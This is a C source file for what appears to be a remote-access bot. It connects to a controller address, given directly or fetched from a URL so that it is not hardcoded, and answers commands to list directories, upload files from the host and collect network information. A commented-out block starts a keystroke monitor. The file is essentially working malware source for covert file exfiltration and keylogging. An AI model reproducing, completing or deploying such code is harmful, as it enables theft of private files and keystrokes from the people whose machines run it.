#include "bot.h"

int main( int argc, const char **argv ) {
    int len;
    int ntoks;
    int pcode;
    int nbytes;
    char *option;
    char *tokens[0xFF];
    char erbuf[0xFF];
    struct option opt, *vopt = &opt;
    struct sockaddr_in serv_addr;
    struct timeval timeout;
    char *ip, *port;
    pthread_t kstrd;
    
    if ( argc != 0x2 ) {
        fprintf( stdout, "usage: %s --ip=<ip:port>\n", *argv );
        fprintf( stdout, "usage: %s --url=<url to download txt file containing server ip>\n", *argv );
        return -1;
    }

    /* url format must be `http://host:port/path` or `http://host:port/` [NO HTTPS!!!!] */
    /* without the port included in the url or without the `http://` scheme the download won't work!!! */
    option = (char *) *++argv;
    len    = strlen( option );
    vopt->key   = optname( option );
    vopt->value = optvalue( option );

    int _sock = socket( AF_INET, SOCK_STREAM, 0x00 );
    if ( _sock == -1 ) {
        fprintf( stderr, "[Error][%s] - %s", __FILE__, strerror( errno ) );
        return -1;
    }

    int _opt = 1;
    int _sop1 = setsockopt( _sock, SOL_SOCKET, SO_REUSEADDR, &_opt, sizeof( _opt ) );
    if ( _sop1 == -1 ) {
        fprintf( stderr, "[Error][%s] - %s", __FILE__, strerror( errno ) );
        return -1;
    }

    if ( strcmp( vopt->key, "--ip" ) == 0 ) {
        int rcode = split_string( vopt->value, strlen( vopt->value ), ":", tokens, &ntoks, erbuf );

        if ( rcode == 0 ) {
            ip   = (char *) malloc( 20 * sizeof( char ) );
            port = (char *) malloc( 10 * sizeof( char ) );
            memcpy( ip, trim( *tokens, strlen( *tokens ) ), strlen( *tokens ) + 1 );
            memcpy( port, trim( *(tokens + 1), strlen( *(tokens + 1) ) ), strlen( *(tokens + 1) ) + 1 );
        }
    } 
    else if ( strcmp( vopt->key, "--url" ) == 0 ) {
        /* this option is used if you dont want your ip to be hardcoded directly */
        /* download the contents of the ip file and store them in `botTIo.txt` file */
        /* format of the contents of the ip file must be `ip:port` */
        char *fpath = (getenv( "HOME" ) == NULL) ? "/tmp/botTIo.txt" : strcat(getenv( "HOME" ), "/botTIo.txt") ;
        int d_stat  = download_ip_file( vopt->value, fpath );

        if ( d_stat == 0 ) {
            ip    = (char *) malloc( 30 * sizeof( char ) );
            port  = (char *) malloc( 15 * sizeof( char ) );
            pcode = parse_ip_file( fpath, ip, port );
            /* remove the file as soon as we get its contents */
            unlink( fpath );
        } else {
            fprintf( stderr, "[Error][%s] - File download error!\n", __FILE__ );
            return -1;
        }
    }
    
    memset( &serv_addr, '0', sizeof( serv_addr ) );
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons( atoi( port ) );

    if ( inet_pton( AF_INET, ip, &serv_addr.sin_addr ) <= 0 ) {
        fprintf( stderr, "[Error][%s] - IP format is invalid!\n", __FILE__ );
        return -1;
    }

   int _cn = connect( _sock, (struct sockaddr *)&serv_addr, sizeof( serv_addr ) );
    if ( _cn == -1 ) {
        retry_connect(_sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr),5);
    }

    /* commands handling starts here */
    int num_entries;
    char rc_buff[BUFSIZ], *rcp = rc_buff;
    char fname[1024];
    char dirname[1024];
    char ferrbuf[0xFF];
    char sbuf[0xc350]; /* 50000 */
    char netbuf[0xc350]; /* 50000 */
    struct scdirs entries[5000];

    while ( (nbytes = recv( _sock, rc_buff, sizeof( rc_buff ), 0x00 )) ) {
        /* *(rcp + strlen( rc_buff )) = '\x00'; */
        if ( strstr( rc_buff, "fscan" ) == NULL && strstr( rc_buff, "fsend" ) == NULL && strstr( rc_buff, "net" ) == NULL ) {
            send( _sock, nocmd, strlen( nocmd ) + 1, 0x00 );
        } else {
            if ( strstr( rc_buff, "fscan" ) != NULL ) {
                if ( get_cmd_param( rc_buff, dirname ) != -1 ) {
                    if ( ftp_scandir( dirname, entries, sbuf, ferrbuf, &num_entries ) != -1 ) {
                        send( _sock, sbuf, strlen( sbuf ) + 1, 0x00 );
                    } else {
                        send( _sock, ferrbuf, strlen( ferrbuf ) + 1, 0x00 );
                    }
                } else {
                    send( _sock, noprm, strlen( noprm ) + 1, 0x00 );
                }
            }

            else if ( strstr( rc_buff, "fsend" ) != NULL ) {
                if ( get_cmd_param( rc_buff, fname ) != -1 ) {
                    if ( ftp_transfer_file( _sock, fname ) == -1 ) {
                        send( _sock, file_r, strlen( file_r ) + 1, 0x00 );
                    }
                } else {
                    send( _sock, noprm, strlen( noprm ) + 1, 0x00 );
                }
            }

            else if ( strstr( rc_buff, "net" ) != NULL ) {
                net_gatherinfo( _sock, netbuf );
            }
        }
        memset( sbuf, '\x00', sizeof( sbuf ) );
        memset( rc_buff, '\x00', sizeof( rc_buff ) );
       /* memset( netbuf, '\x00', sizeof( netbuf ) ); */
    }
    /* after successfull connection start the keystroke thread */
    /*int *zsock = &_sock;
    int _rc = pthread_create( &kstrd, NULL, key_monitor_start, (void *) zsock );
    if ( !_rc ) {
        pthread_join( kstrd, NULL );
    }*/
    free( ip ); free( port );

    return 0;
}

int retry_connect( int sock, const struct sockaddr *addr, socklen_t len, int delay ) {
    while ( 1 ) {
        sleep( delay );
        if ( connect( sock, addr, len ) == 0 ) {
            fprintf( stdout, "connected to server\n" );
            return 0;
        }
        fprintf( stdout, "connection fffaileddd...\n" );
    }
    return -1;
}

int ftp_scandir( const char *dirname, struct scdirs *entries, char *sbuf, char *errbuf, int *num_entries ) {
    int nobjs;
    struct dirent **nlist;

    if ( strcmp( dirname, "" ) == 0 ) {
        strcpy( errbuf, strerror( ENOENT ) );
        return -1;
    }
    nobjs = scandir( dirname, &nlist, NULL, alphasort );
    if ( nobjs == -1 ) {
        strcpy( errbuf, strerror( errno ) );
        return -1;
    }
    *num_entries = nobjs;
    while ( nobjs-- ) {
        entries[nobjs].entryname = (char *) malloc( 2048 * sizeof( char ) );
        memcpy( entries[nobjs].entryname, nlist[nobjs]->d_name, strlen( nlist[nobjs]->d_name ) + 1 );
        strcat( entries[nobjs].entryname, "\n" );
        strcat( sbuf, entries[nobjs].entryname );
        free( nlist[nobjs] );
        free( entries[nobjs].entryname );
    }
    free( nlist ), errbuf = NULL; return 0;
}

int ftp_transfer_file( int sock, char *fname ) {
    int c;
    char buff[0x400], name[0x200];
    char eof[0x200];
    FILE *fp;

    if ( is_file( fname ) == 0 && (fp = fopen( fname, "rb" )) != NULL ) {
        file_get_name( fname, name );

        while ( !feof( fp ) ) {
            fread( buff, sizeof( buff ), 0x01, fp );
            send( sock, buff, sizeof( buff ), 0x00 );
            memset( buff, '\x00', sizeof( buff ) );
            sleep( 1 );
        }
        sprintf( eof, "[EOF][FNAME=%s]", name );
        send( sock, eof, 0x200, 0x00 );
        memset( name, '\x00', 0x200 );
        return 0;
    }
    return -1;
}

int file_get_name( char *fname, char *name ) {
    int j = 0, k = 0, i = strcend( fname, "/" );
    char *nname = &fname[++i];
    
    while ( j < strlen( nname ) ) {
        *(name + (j++)) = nname[k++];
    }
    *(name + j) = '\x00';
    return 0;
}

int get_cmd_param( const char *cmd, char *param ) {
    int pstart, i, j;
    char *ccmd = (char *) cmd;
    
    if ( !cmd ) {
        return -1;
    }
    if ( strstr( cmd, " " ) == NULL ) {
        return -1;
    }
    pstart = strpos( ccmd, " " );
    for ( i = pstart + 1, j = 0 ; *(ccmd + i) != '\x00' && *(ccmd + i) != '\x0a' ; i++ ) {
        param[j++] = *(ccmd + i);
    }
    param[j] = '\x00';
    return 0;
}

char * optname( const char *opt ) {
    int i = 0;
    int optname_end = strpos( opt, "=" );
    static char optname[10];

    if ( optname_end > 0 ) {
        while ( *opt != '=' ) { optname[i++] = *opt, opt++; }
        optname[i] = '\x00';
        return optname;
    }
    return NULL;
}

char * optvalue( const char *opt ) {
    int i, j = 0;
    int optname_end = strpos( opt, "=" );
    static char optvalue[1024];

    if ( optname_end > 0 ) {
        i = optname_end + 1, opt = opt + i;

        while ( *opt != '\x00' ) { optvalue[j++] = *opt++; }
        optvalue[j] = '\x00';
        return optvalue;
    }
    return NULL;
}

int parse_ip_file( const char *fname, char *ip, char *port ) {
    int c, p = 0;
    FILE *fp;

    if ( (fp = fopen( fname, "r" )) != NULL ) {
        while ( (c = getc( fp )) != EOF ) {
            if ( c == ':' ) {
                p = 1; continue; 
            }
            if ( !p ) { *ip++ = c; }
            if ( p )  { *port++ = c; }
        }
        *ip = '\x00', *port = '\x00'; return ( !p ) ? -1 : 0 ;
    }
    return -1;
}

int is_file( const char *fname ) {
    struct stat ffstat;
    if ( stat( fname, &ffstat ) < 0x00 ) {
        return -1;
    }
    return (S_ISREG( ffstat.st_mode )) ? 0 : -1 ;
}

/*void free_entries( struct scdirs *entries, int num_entries ) {
    for ( int i = 0 ; i < num_entries ; i++ ) {
        free( entries[i].entryname );
    }
}*/
